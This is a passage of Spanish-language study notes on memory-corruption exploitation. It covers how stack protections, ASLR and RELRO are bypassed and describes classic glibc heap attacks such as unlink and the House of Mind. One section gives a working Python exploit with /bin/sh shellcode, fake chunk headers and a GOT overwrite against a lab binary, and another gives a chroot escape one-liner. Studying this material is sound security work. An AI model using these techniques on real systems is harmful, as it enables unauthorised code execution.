<p>Actualmente las direcciones a las funciones que hay que ejecutar se esconden tras varias estructuras  y finalmente la direcci&#xF3;n a la que apunta no son las direcciones de las funciones, sino que est&#xE1;n cifradas con XOR y desplazamientos con una clave aleatoria. Por lo que actualmente este vector de ataque no es de mucha utilidad por lo menos en x86 y x64_86. La funci&#xF3;n de cifrado es PTR_MANGLE.</p>
<p>Otras arquitecturas como m68k, mips32, mips64, aarch64, arm, hppa&#x2026; No implementas la funci&#xF3;n de cifrado pues que esta devuelve lo mismo que recibi&#xF3; como entrada. As&#xED; que estas arquitectura s&#xED; ser&#xED;an atacables mediante este vector.</p>
<h4 id="setjmp-y-longjmp-ya-no-&#xFA;til-en-general"><strong>setjmp() y longjmp() (ya no &#xFA;til en general)</strong></h4>
<p>Setjmp() permite guardar el contexto (los registros)</p>
<p>longjmp() permite restablecer el contexto</p>
<p>Los registros guardados son: EBX, ESI, EDI, ESP, EIP, EBP</p>
<p>Lo que pasa es que EIP y ESP son pasados por la funci&#xF3;n PTR_MANGLE, por lo que las arquitectura vulnerables a este ataque son las mismas que las anteriores.</p>
<p>Son &#xFA;tiles para recuperaci&#xF3;n de errores o interrupciones.</p>
<p>Sin embargo, seg&#xFA;n lo le&#xED;do, no se protegen los dem&#xE1;s registros, por lo que si dentro de la funci&#xF3;n a la que se llame hay un call ebx, call esi o call edi se puede tomar el control. O tambi&#xE9;n se podr&#xED;a modificar EBP para modificar el ESP.</p>
<h4 id="vtable-y-vptr-en-c"><strong>VTable y VPTR en C++</strong></h4>
<p>Cada clase tiene una Vtable que es un array de punteros a m&#xE9;todos.</p>
<p>Cada objeto de una clase tiene un VPtr que es un puntero a la Viable de su clase. El VPtr forma parte de la cabecera de cada objeto, por lo que si se logra una sobreescritura del VPtr se podr&#xED;a modificar para que apuntase a una Viable falsa para que al ejecutar una funci&#xF3;n se fuese a la shellcode.</p>
<h2 id="medidas-preventivas-y-evasiones"><strong>Medidas preventivas y evasiones</strong></h2>
<h4 id="aslr-no-tan-aleatorio"><strong>ASLR no tan aleatorio</strong></h4>
<p>PaX dive el espacio de direcciones del proceso en 3 grupos:</p>
<p>Codigo y datos iniciados y no iniciados: .text, .data y .bss &#x2014;&gt; 16bits de entropia en la variable delta_exec, esta variable se inicia aleatoriamente con cada proceso y se suma a las direcciones iniciales</p>
<p>Memoria asignada por mmap() y libraries compartidas &#x2014;&gt; 16bits, delta_mmap</p>
<p>El stack &#x2014;&gt; 24bits, delta_stack &#x2014;&gt; Realmente 11 (del byte 10&#xBA; al 20&#xBA; inclusive) &#x2014;&gt;alineado a 16bytes &#x2014;&gt; 524.288 posibles direcciones reales del stack</p>
<p>Las variables de entorno y los argumentos se desplazan menos que un buffer en el stack.</p>
<p><strong>Return-into-printf</strong></p>
<p>Es una t&#xE9;cnica para convertir un buffer overflow en un error de cadena de formato. Consiste en sustituir el EIP para que apunte a un printf de la funci&#xF3;n y pasarle como argumento una cadena de formato manipulada para obtener valores sobre el estado del proceso.</p>
<p><strong>Ataque a librer&#xED;as</strong></p>
<p>Las librer&#xED;as est&#xE1;n en una posici&#xF3;n con 16bits de aleatoriedad = 65636 posibles direcciones. Si un servidor vulnerable llama a fork() el espacio de direcciones de memoria es clocado en el proceso hijo y se mantiene intacto. Por lo que se puede intentar hacer un brute force a la funci&#xF3;n usleep() de libc pas&#xE1;ndole como argumento &#x201C;16&#x201D; de forma que cuando tarde m&#xE1;s de lo normal en responder se habr&#xE1; encontrado dicha funci&#xF3;n. Sabiendo d&#xF3;nde est&#xE1; dicha funci&#xF3;n se puede obtener delta_mmap y calcular las dem&#xE1;s.</p>
<p>La &#xFA;nica forma de estar seguros de que el ASLR funciona es usando arquitectura de 64bits. Ah&#xED; no hay ataques de fuerza bruta.</p>
<h4 id="stackguard-y-stackshield"><strong>StackGuard y StackShield</strong></h4>
<p><strong>StackGuard</strong> inserta antes del EIP &#x2014;&gt; 0x000aff0d(null, \n, EndOfFile(EOF), \r) &#x2014;&gt; Siguen siendo vulnerables recv(), memcpy(), read(), bcoy() y no protege el EBP</p>
<p><strong>StackShield</strong> es m&#xE1;s elaborado que StackGuard</p>
<p>Guarda en una tabla (Global Return Stack) todas las direcciones EIP de vuelta de forma que el overflow no cause ning&#xFA;n da&#xF1;o. Ademas, se pueden comparar ambas direcciones para a ver si ha habido un desbordamiento.</p>
<p>Tambi&#xE9;n se puede comprobar la direcci&#xF3;n de retorno con un valor l&#xED;mite, as&#xED; si el EIP se va a un sitio distinto del habitual como el espacio de datos se sabr&#xE1;. Pero esto se sortea con Ret-to-lib, ROPs o ret2ret.</p>
<p>Como se puede ver stackshield tampoco protege las variables locales.</p>
<h4 id="stack-smash-protector-propolice--fstack-protector"><strong>Stack Smash Protector (ProPolice) -fstack-protector</strong></h4>
<p>Se pone el canary antes del EBP. Reordena las variables locales para que los buffers est&#xE9;n en las posiciones m&#xE1;s altas y as&#xED; no puedan sobreescribir otras variables.</p>
<p>Adem&#xE1;s, realiza una copia segura de los argumentos pasados encima de la pila (encima de las vars locales) y usa estas copias como argumentos.</p>
<p>No puede proteger arrays de menos de 8 elementos ni buffers que formen parte de una estructura del usuario.</p>
<p>El canary es un n&#xFA;mero random sacado de &#x201C;/dev/urandom&#x201D; o sino es 0xff0a0000. Se almacena en TLS(Thread Local Storage). Los hilos comparten el mismo espacio de memoria, el TLS es un &#xE1;rea que tiene variables globales o est&#xE1;ticas de cada hilo. Sin embargo, en ppio estas son copiadas del proceso padre aunque el proceso hijo podr&#xED;a modificar estos datos sin modificar los del padre ni los de los dem&#xE1;s hijos. El problema es que si se usa fork() pero no se crea un nuevo canario, entonces todos los procesos (padre e hijos) usan el mismo canario. En i386 se almacena en gs:0x14 y en x86_64 se almacena en fs:0x28</p>
<p>Esta protecci&#xF3;n localiza funciones que tengan buffer que puedan ser atacados e incluye en ellas c&#xF3;digo al ppio de la funci&#xF3;n para colocar el canario y c&#xF3;digo al final para comprobarlo.</p>
<p>La funci&#xF3;n fork() realiza una copia exacta del proceso del padre, por eso mismo si un servidor web llama a fork() se puede hacer un ataque de fuerza bruta byte por byte hasta averiguar el canary que se est&#xE1; utilizando.</p>
<p>Si se usa la funci&#xF3;n execve() despu&#xE9;s de fork(), se sobreescribe el espacio y el ataque ya no es posible. vfork() permite ejecutar el proceso hijo sin crear un duplicado hasta que el proceso hijo intentase escribir, entonces s&#xED; creaba el duplicado.</p>
<h4 id="relocation-read-only-relro"><strong>Relocation Read-Only (RELRO)</strong></h4>
<p>Cuando el binario es cargado en memoria y una funci&#xF3;n es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aqu&#xED; se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una direcci&#xF3;n siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la direcci&#xF3;n y la guarde en la GOT.</p>
<p>Cuando se llama a una funci&#xF3;n se llama a la PLT, esta tiene la direcci&#xF3;n de la GOT donde se almacena la direcci&#xF3;n de la funci&#xF3;n, por lo que redirige el flujo all&#xED; y as&#xED; se llama a la funci&#xF3;n. Sin embargo, si es la primera vez que se llama a la funci&#xF3;n, lo que hay en la GOT es la siguiente instrucci&#xF3;n de la PLT, por lo tanto el flujo sigue el c&#xF3;digo de la PLT (rtfd) y averigua la direcci&#xF3;n de la funci&#xF3;n, la guarda en la GOT y la llama.</p>
<p>Al cargar un binario en memoria el compilador le ha dicho en qu&#xE9; offset tiene que situar datos que se deben de cargar cuando se corre el programa.</p>
<p>Lazy binding &#x2014;&gt; La direcci&#xF3;n de la funci&#xF3;n se busca la primera vez que se invoca dicha funci&#xF3;n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ah&#xED; y no haya que volver a buscarla.</p>
<p>Bind now &#x2014;&gt; Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. <strong>-z relro</strong>  y  <strong>-z now</strong></p>
<p>A pesar de esto, en general los programas no est&#xE1;n complicados con esas opciones luego estos ataques siguen siendo posibles.</p>
<p><strong>readelf -l /proc/ID_PROC/exe | grep BIND_NOW</strong> &#x2014;&gt; Para saber si usan el BIND NOW</p>
<h4 id="fortify-source--dfortifysource1-o-2"><strong>Fortify Source -D_FORTIFY_SOURCE=1 o =2</strong></h4>
<p>Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funci&#xF3;n por una funci&#xF3;n segura.</p>
<p>Por ej:<br>char buf[16];<br>strcpy(but, source);</p>
<p>La identifica como insegura y entonces cambia strcpy() por __strcpy_chk() utilizando el tama&#xF1;o del buffer como tama&#xF1;o m&#xE1;ximo a copiar.</p>
<p>La diferencia entre <strong>=1</strong>  o <strong>=2</strong> es que:</p>
<p>La segunda no permite que <strong>%n</strong> venga de una secci&#xF3;n con permisos de escritura. Adem&#xE1;s el par&#xE1;metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar <strong>%3$d</strong> si antes se ha usado <strong>%2$d</strong> y <strong>%1$d</strong></p>
<p>Para mostrar el mensaje de error se usa el argv[0], por lo que si se pone en el la direcci&#xF3;n de otro sitio (como una variable global) el mensaje de error mostrar&#xE1; el contenido de dicha variable. Pag 191</p>
<h4 id="reemplazo-de-libsafe"><strong>Reemplazo de Libsafe</strong></h4>
<p>Se activa con: LD_PRELOAD=/lib/libsafe.so.2<br>o<br>&#x201C;/lib/libsave.so.2&#x201D; &gt; /etc/ld.so.preload</p>
<p>Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No est&#xE1; estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD_PRELOAD no sirve en binarios con suid).</p>
<h4 id="ascii-armored-address-space"><strong>ASCII Armored Address Space</strong></h4>
<p>Consiste en cargar las librer&#xED;a compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ning&#xFA;n ataque, y menos en little endian.</p>
<p><strong>ret2plt</strong></p>
<p>Consiste en realiza un ROP de forma que se llame a la funci&#xF3;n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci&#xF3;n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2&#xBA;byte de system()&#x2026; Al final se llama la direcci&#xF3;n guardada en GOT que ser&#xE1; system()</p>
<p><strong>Falso EBP</strong></p>
<p>Para las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP tambi&#xE9;n para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y despu&#xE9;s la direcci&#xF3;n a &amp;&#x201D;/bin/sh&#x201D;.</p>
<h4 id="jaulas-con-chroot"><strong>Jaulas con chroot()</strong></h4>
<p>debootstrap -arch=i386 hardy  /home/user &#x2014;&gt; Instala un sistema b&#xE1;sico bajo un subdirectorio espec&#xED;fico</p>
<p>Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..</p>
<h4 id="instrumentaci&#xF3;n-de-c&#xF3;digo"><strong>Instrumentaci&#xF3;n de c&#xF3;digo</strong></h4>
<p>Valgrind &#x2014;&gt; Busca errores<br>Memcheck<br>RAD (Return Address Defender)<br>Insure++</p>
<h2 id="8-heap-overflows-exploits-b&#xE1;sicos"><strong>8 Heap Overflows: Exploits b&#xE1;sicos</strong></h2>
<p><strong>Trozo asignado</strong></p>
<p>prev_size      |<br>size                 |           &#x2014;Cabecera<br>*mem | Datos</p>
<p><strong>Trozo libre</strong></p>
<p>prev_size     |<br>size                  |<br>*fd                   | Ptr forward chunk<br>*bk                  | Ptr back chunk       &#x2014;Cabecera<br>*mem | Datos</p>
<p>Los trozos libres est&#xE1;n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)</p>
<p>En &#x201C;size&#x201D; hay bits para indicar: Si el trozo anterior est&#xE1; en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.</p>
<p>Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m&#xE1;s grande a frontlink() para que le inserte el bin adecuado.</p>
<p>unlink(){<br>BK = P-&gt;bk; &#x2014;&gt; El BK del nuevo chunk es el que tuviese el que ya estaba libre antes<br>FD = P-&gt;fd; &#x2014;&gt; El FD del nuevo chunk es el que tuviese el que ya estaba libre antes<br>FD-&gt;bk = BK; &#x2014;&gt; El BK del siguiente chunk apunta al nuevo chunk<br>BK-&gt;fd = FD; &#x2014;&gt; El FD del anterior chunk apunta al nuevo chunk<br>}</p>
<p>Por lo tanto si conseguimos modificar el P-&gt;bk con la direcci&#xF3;n de un shellcode y el P-&gt;fd con la direcci&#xF3;n a una entrada en la GOT o DTORS menos 12 se logra:</p>
<p>BK = P-&gt;bk = &amp;shellcode<br>FD = P-&gt;fd = &amp;__dtor_end__ - 12<br>FD-&gt;bk = BK -&gt; *((&amp;__dtor_end__ - 12) + 12) = &amp;shellcode</p>
<p>Y as&#xED; se se ejecuta al salir del programa la shellcode.</p>
<p>Adem&#xE1;s, la 4&#xBA; sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:</p>
<p>BK-&gt;fd = FD -&gt; *(&amp;shellcode + 8) = (&amp;__dtor_end__ - 12) &#x2014;&gt; Esto provoca la escritura de 4 bytes a partir del 8&#xBA; byte de la shellcode, por lo que la primera instrucci&#xF3;n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.</p>
<p>Por lo tanto el exploit se crea:</p>
<p>En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.</p>
<p>Despu&#xE9;s de la shell code metemos relleno hasta llegar al campo prev_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev_size para que tenga el bit que dice que est&#xE1; libre) y &#x201C;-4&#x201C;(0xfffffffc) en el size (para que cuando compruebe en el 3&#xBA; trozo si el 2&#xBA; estaba libre en realidad vaya al prev_size modificado que le dir&#xE1; que s&#xB4;est&#xE1; libre) -&gt; As&#xED; cuando free() investigue ir&#xE1; al size del 3&#xBA; pero en realidad ir&#xE1; al 2&#xBA; - 4 y pensar&#xE1; que el 2&#xBA; trozo est&#xE1; libre. Y entonces llamar&#xE1; a <strong>unlink()</strong>.</p>
<p>Al llamar a unlink() usar&#xE1; como P-&gt;fd los primeros datos del 2&#xBA; trozo por lo que ah&#xED; se meter&#xE1; la direcci&#xF3;n que se quieres sobreescribir - 12(pues en FD-&gt;bk le sumar&#xE1; 12 a la direcci&#xF3;n guardada en FD) . Y en esa direcci&#xF3;n introducir&#xE1; la segunda direcci&#xF3;n que encuentre en el 2&#xBA; trozo, que nos interesar&#xE1; que sea la direcci&#xF3;n a la shellcode(P-&gt;bk falso).</p>
<p><strong>from struct import *</strong></p>
<p><strong>import os</strong></p>
<p><strong>shellcode = &quot;\xeb\x0caaaabbbbcccc&quot; #jm 12 + 12bytes de relleno</strong></p>
<p><strong>shellcode += &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot; \</strong></p>
<p><strong>&quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot; \</strong></p>
<p><strong>&quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;</strong></p>
<p><strong>prev_size = pack(&quot;&lt;I&#x201D;, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est&#xE1; libre est&#xE9; a 1</strong></p>
<p><strong>fake_size = pack(&quot;&lt;I&#x201D;, 0xfffffffc) #-4, para que piense que el &#x201C;size&#x201D; del 3&#xBA; trozo est&#xE1; 4bytes detr&#xE1;s (apunta a prev_size) pues es ah&#xED; donde mira si el 2&#xBA; trozo est&#xE1; libre</strong></p>
<p><strong>addr_sc = pack(&quot;&lt;I&quot;, 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno</strong></p>
<p><strong>got_free = pack(&quot;&lt;I&quot;, 0x08048300 - 12) #Direcci&#xF3;n de free() en la plt-12 (ser&#xE1; la direcci&#xF3;n que se sobrescrita para que se lanza la shellcode la 2&#xBA; vez que se llame a free)</strong></p>
<p><strong>payload = &quot;aaaabbbb&quot; + shellcode + &quot;b&quot;*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s&#xED;</strong></p>
<p><strong>payload += prev_size + fake_size + got_free + addr_sc #Se modifica el 2&#xBA; trozo, el got_free apunta a donde vamos a guardar la direccion addr_sc + 12</strong></p>
<p><strong>os.system(&quot;./8.3.o &quot; + payload)</strong></p>
<p><strong>unset() liberando en sentido inverso (wargame)</strong></p>
<p>Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.</p>
<p>En ese caso:</p>
<p>En el chunck c se pone el shellcode</p>
<p>El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV_INUSE desactivado de forma que piense que el chunck a est&#xE1; libre.</p>
<p>Adem&#xE1;s, se sobreescribe en la cabecera b el size para que valga -4.</p>
<p>Entonces, el programa se pensar&#xE1; que &#x201C;a&#x201D; est&#xE1; libre y en un bin, por lo que llamar&#xE1; a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV_SIZE vale -4. Se pensar&#xE1; que el trozo de &#x201C;a&#x201D; realmente empieza en b+4. Es decir, har&#xE1; un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar&#xE1; el puntero &#x201C;fd&#x201D; y en b+16 estar&#xE1; el puntero &#x201C;bk&#x201D;.</p>
<p>De esta forma, si en bk ponemos la direcci&#xF3;n a la shellcode y en fd ponemos la direcci&#xF3;n a la funci&#xF3;n &#x201C;puts()&#x201D;-12 tenemos nuestro payload.</p>
<p><strong>T&#xE9;cnica de Frontlink</strong></p>
<p>Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().</p>
<p>Vulnerabilidad &#xFA;til cuando el malloc que se ataca nunca es liberado (free()).</p>
<p>Necesita:</p>
<p>Un buffer que pueda desbordarse con la funci&#xF3;n de entrada de datos</p>
<p>Un buffer contiguo a este que debe ser liberado y al que se le modificar&#xE1; el campo fd de su cabecera gracias al desbordamiento del buffer anterior</p>
<p>Un buffer a liberar con un tama&#xF1;o mayor a 512 pero menor que el buffer anterior</p>
<p>Un buffer declarado antes del paso 3 que permita sobreescribir el prev_size de este</p>
<p>De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.</p>
<p><strong>Vulnerabilidad double free()</strong></p>
<p>Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci&#xF3;n.</p>
<p>En caso de querer volver a usar uno se asignar&#xED;a sin problemas. En caso de querer usar otro, se le asignar&#xED;a el mismo espacio por lo que tendr&#xED;amos los punteros &#x201C;fd&#x201D; y &#x201C;bk&#x201D; falseados con los datos que escribir&#xE1; la reserva anterior.</p>
<p><strong>After free()</strong></p>
<p>Un puntero previamente liberado es usado de nuevo sin control.</p>
<h2 id="8-heap-overflows-exploits-avanzados"><strong>8 Heap Overflows: Exploits avanzados</strong></h2>
<p>Las t&#xE9;cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci&#xF3;n unlink().</p>
<h4 id="the-house-of-mind"><strong>The house of mind</strong></h4>
<p>Solo una llamada a free() es necesaria para provocar la ejecuci&#xF3;n de c&#xF3;digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.</p>
<p>Una llamada a free() provoca llamar a public_fREe(mem), este hace:</p>
<p>mstate ar_ptr;</p>
<p>mchunkptr p;</p>
<p>&#x2026;</p>
<p>p = mem2chunk(mes); &#x2014;&gt; Devuelve un puntero a la direcci&#xF3;n donde comienza el trozo (mem-8)</p>
<p>&#x2026;</p>
<p>ar_ptr = arena_for_chunk(p); &#x2014;&gt; chunk_non_main_arena(ptr)?heap_for_ptr(ptr)-&gt;ar_ptr:&amp;main_arena [1]</p>
<p>&#x2026;</p>
<p>_int_free(ar_ptr, mem);</p>
<p>}</p>
<p>En [1] comprueba el campo size el bit NON_MAIN_ARENA, el cual se puede alterar para que la comprobaci&#xF3;n devuelva true y ejecute heap_for_ptr() que hace un and a &#x201C;mem&#x201D; dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000-&gt;ar_ptr (como si fuese un struct heap_info)</p>
<p>De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en <strong>0x081002a0</strong> podemos llegar a la direcci&#xF3;n 0x08100000 y escribir lo que queramos, por ejemplo <strong>0x0804a000</strong>. Cuando este segundo trozo se libere se encontrar&#xE1; que heap_for_ptr(ptr)-&gt;ar_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah&#xED; se saca el valor de los 4 primeros bytes, el ar_ptr)</p>
<p>De esta forma se llama a _int_free(ar_ptr, mem), es decir, <strong>_int_free(0x0804a000, 0x081002a0)<br>_int_free(mstate av, Void_t* mem){</strong><br>&#x2026;<br>bck = unsorted_chunks(av);<br>fwd = bck-&gt;fd;<br>p-&gt;bk = bck;<br>p-&gt;fd = fwd;<br>bck-&gt;fd = p;<br>fwd-&gt;bk = p;</p>
<p>..}</p>
<p>Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.</p>
<p>Tal y como se define unsorted_chunks, sabemos que:<br>bck = &amp;av-&gt;bins[2]-8;<br>fwd = bck-&gt;fd = *(av-&gt;bins[2]);<br>fwd-&gt;bk = *(av-&gt;bins[2] + 12) = p;</p>
<p>Por lo tanto si en av-&gt;bins[2] escribimos el valor de __DTOR_END__-12 en la &#xFA;ltima instrucci&#xF3;n se escribir&#xE1; en __DTOR_END__ la direcci&#xF3;n del segundo trozo.</p>
<p>Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci&#xF3;n de __DTOR_END__-12 porque de ah&#xED; la sacar&#xE1; av-&gt;bins[2]</p>
<p>En la direcci&#xF3;n que caiga la direcci&#xF3;n del segundo trozo con los &#xFA;ltimos 5 ceros hay que escribir la direcci&#xF3;n a este primer trozo para que heap_for_ptr() piense que el ar_ptr est&#xE1; al inicio del primer trozo y saque de ah&#xED; el av-&gt;bins[2]</p>
<p>En el segundo trozo y gracias al primero sobreescribimos el prev_size con un jump 0x0c y el size con algo para activar -&gt; NON_MAIN_ARENA</p>
<p>A continuaci&#xF3;n en el trozo 2 ponemos un mont&#xF3;n de nops y finalmente la shellcode</p>
<p>De esta forma se llamar&#xE1; a _int_free(TROZO1, TROZO2) y seguir&#xE1; las instrucciones para escribir en __DTOR_END__ la direcci&#xF3;n del prev_size del TROZO2 el cual saltar&#xE1; a la shellcode.</p>
<p>Para aplicar esta t&#xE9;cnica hace falta que se cumplan algunos requerimientos m&#xE1;s que complican un poco m&#xE1;s el payload.</p>
<p>Esta t&#xE9;cnica ya no es aplicable pues se aplic&#xF3; casi el mismo parche que para unlink. Se comparan si el nuevo sitio al que se apunta tambi&#xE9;n le est&#xE1; apuntando a &#xE9;l.</p>
<p><strong>Fastbin</strong></p>
<p>Es una variante de The house of mind</p>
<p>nos interesa llegar a ejecutar el siguiente c&#xF3;digo al cu&#xE1;l se llega pasada la primera comprobaci&#xF3;n de la funci&#xF3;n _int_free()</p>
<p>fb = &amp;(av-&gt;fastbins[fastbin_index(size)] &#x2014;&gt; Siendo fastbin_index(sz) &#x2014;&gt; (sz &gt;&gt; 3) - 2</p>
<p>&#x2026;</p>
<p>p-&gt;fd = *fb</p>
<p>*fb = p</p>
<p>De esta forma si se pone en &#x201C;fb&#x201D; da direcci&#xF3;n de una funci&#xF3;n en la GOT, en esta direcci&#xF3;n se pondr&#xE1; la direcci&#xF3;n al trozo sobrescrito. Para esto ser&#xE1; necesario que la arena est&#xE9; cerca de las direcciones de dtors. M&#xE1;s exactamente que av-&gt;max_fast est&#xE9; en la direcci&#xF3;n que vamos a sobreescribir.</p>
<p>Dado que con The House of Mind se vio que nosotros control&#xE1;bamos la posici&#xF3;n del av.</p>
<p>Entones si en el campo size ponemos un tama&#xF1;o de 8 + NON_MAIN_ARENA + PREV_INUSE &#x2014;&gt; fastbin_index() nos devolver&#xE1; fastbins[-1], que apuntar&#xE1; a av-&gt;max_fast</p>
<p>En este caso av-&gt;max_fast ser&#xE1; la direcci&#xF3;n que se sobrescrita (no a la que apunte, sino esa posici&#xF3;n ser&#xE1; la que se sobrescrita).</p>
<p>Adem&#xE1;s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -&gt; Dado que hemos dicho que el size del trozo liberado es 8, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem&#xE1;s la shellcode ir&#xE1; en el trozo liberado, habr&#xE1; que poner al ppio un jmp que caiga en nops).</p>
<p>Adem&#xE1;s, ese mismo trozo falso debe ser menor que av-&gt;system_mem. av-&gt;system_mem se encuentra 1848 bytes m&#xE1;s all&#xE1;.</p>
<p>Por culpa de los nulos de _DTOR_END_ y de las pocas direcciones en la GOT, ninguna direcci&#xF3;n de estas secciones sirven para ser sobrescritas, as&#xED; que veamos como aplicar fastbin para atacar la pila.</p>
<p>Otra forma de ataque es redirigir el <strong>av</strong> hacia la pila.</p>
<p>Si modificamos el size para que de 16 en vez de 8 entonces: fastbin_index() nos devolver&#xE1; fastbins[0] y podemos hacer uso de esto para sobreescribir la pila.</p>
<p>Para esto no debe haber ning&#xFA;n canary ni valores raros en la pila, de hecho tenemos que encontrarnos en esta: 4bytes nulos + EBP + RET</p>
<p>Los 4 bytes nulo se necesitan que el <strong>av</strong> estar&#xE1; a esta direcci&#xF3;n y el primero elemento de un <strong>av</strong>  es el mutexe que tiene que valer 0.</p>
<p>El <strong>av-&gt;max_fast</strong> ser&#xE1; el EBP y ser&#xE1; un valor que nos servir&#xE1; para saltarnos las restricciones.</p>
<p>En el <strong>av-&gt;fastbins[0]</strong> se sobreescribir&#xE1; con la direcci&#xF3;n de <strong>p</strong> y ser&#xE1; el RET, as&#xED; se saltar&#xE1; a la shellcode.</p>
<p>Adem&#xE1;s, en <strong>av-&gt;system_mem</strong> (1484bytes por encima de la posici&#xF3;n en la pila) habr&#xE1; bastante basura que nos permitir&#xE1; saltarnos la comprobaci&#xF3;n que se realiza.</p>
<p>Adem&#xE1;s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -&gt; Dado que hemos dicho que el size del trozo liberado es 16, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem&#xE1;s la shellcode ir&#xE1; en el trozo liberado, habr&#xE1; que poner al ppio un jmp que caiga en nops que van despu&#xE9;s del campo size del nuevo trozo falso).</p>
<p><strong>The House of Spirit</strong></p>
<p>En este caso buscamos tener un puntero a un malloc que pueda ser alterable por el atacante (por ej, que el puntero est&#xE9; en el stack debajo de un posible overflow a una variable).</p>
<p>As&#xED;, podr&#xED;amos hacer que este puntero apuntase a donde fuese. Sin embargo, no cualquier sitio es v&#xE1;lido, el tama&#xF1;o del trozo falseado debe ser menor que av-&gt;max_fast y m&#xE1;s espec&#xED;ficamente igual al tama&#xF1;o solicitado en una futura llamada a malloc()+8. Por ello, si sabemos que despu&#xE9;s de este puntero vulnerable se llama a malloc(40), el tama&#xF1;o del trozo falso debe ser igual a 48.</p>
<p>Si por ejemplo el programa preguntase al usuario por un n&#xFA;mero podr&#xED;amos introducir 48 y apuntar el puntero de malloc modificable a los siguientes 4bytes (que podr&#xED;an pertenecer al EBP con suerte, as&#xED; el 48 queda por detr&#xE1;s, como si fuese la cabecera size). Adem&#xE1;s, la direcci&#xF3;n ptr-4+48 debe cumplir varias condiciones (siendo en este caso ptr=EBP), es decir, 8 &lt; ptr-4+48 &lt; av-&gt;system_mem.</p>
<p>En caso de que esto se cumpla, cuando se llame al siguiente malloc que dijimos que era malloc(40) se le asignar&#xE1; como direcci&#xF3;n la direcci&#xF3;n del EBP. En caso de que el atacante tambi&#xE9;n pueda controlar lo que se escribe en este malloc puede sobreescribir tanto el EBP como el EIP con la direcci&#xF3;n que quiera.</p>
<p>Esto creo que es porque as&#xED; cuando lo libere free() guardar&#xE1; que en la direcci&#xF3;n que apunta al EBP del stack hay un trozo de tama&#xF1;o perfecto para el nuevo malloc() que se quiere reservar, as&#xED; que le asigna esa direcci&#xF3;n.</p>
<p><strong>The House of Force</strong></p>
<p>Es necesario:</p>
<ul>
<li>Un overflow a un trozo que permita sobreescribir el wilderness</li>
<li>Una llamada a malloc() con el tama&#xF1;o definido por el usuario</li>
<li>Una llamada a malloc() cuyos datos puedan ser definidos por el usuario</li>
</ul>
<p>Lo primero que se hace es sobreescribir el size del trozo wilderness con un valor muy grande (0xffffffff), as&#xED; cual quiera solicitud de memoria lo suficientemente grande ser&#xE1; tratada en _int_malloc() sin necesidad de expandir el heap</p>
<p>Lo segundo es alterar el av-&gt;top para que apunte a una zona de memoria bajo el control del atacante, como el stack. En av-&gt;top se pondr&#xE1; &amp;EIP - 8.</p>
<p>Tenemos que sobreescrbir av-&gt;top para que apunte a la zona de memoria bajo el control del atacante:</p>
<p>victim = av-&gt;top;</p>
<p>remainder = chunck_at_offset(victim, nb);</p>
<p>av-&gt;top = remainder;</p>
